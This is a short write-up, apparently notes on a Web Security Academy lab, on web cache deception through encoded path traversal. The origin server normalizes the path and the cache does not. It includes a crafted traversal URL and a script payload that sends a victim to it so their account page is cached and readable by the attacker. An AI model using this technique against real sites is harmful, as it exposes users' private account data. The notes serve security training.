# Using origin server normalization to do web cache deception

If a server has a custom caching rule configured to store static assets under some directory, we can apply normalization discrepancy by crafting a path traversal URL:

```jsx
https://0ad800ea048821e0804ecb7e00db0074.web-security-academy.net/resources/labheader/images%2f..%2f..%2f..%2fmy-account
```

- Origin server applies normalization and processes `/resources/labheader/images%2f..%2f..%2f..%2fmy-account`  as `/my-account`
- Caching agent does not apply normalization and processes `/resources/labheader/images%2f..%2f..%2f..%2fmy-account`  as a static cacheable resource under `/resources` directory

That means we can trick a victim to cache a response with the sensitive data and then access it on our side.

```jsx
<script>document.location="https://0ad800ea048821e0804ecb7e00db0074.web-security-academy.net/resources/labheader/images%2f..%2f..%2f..%2fmy-account"</script>
```

After exploit delivering:

![image.png](Using%20origin%20server%20normalization%20to%20do%20web%20cache%20%201f9021737a89800a8dbfec2380826404/image.png)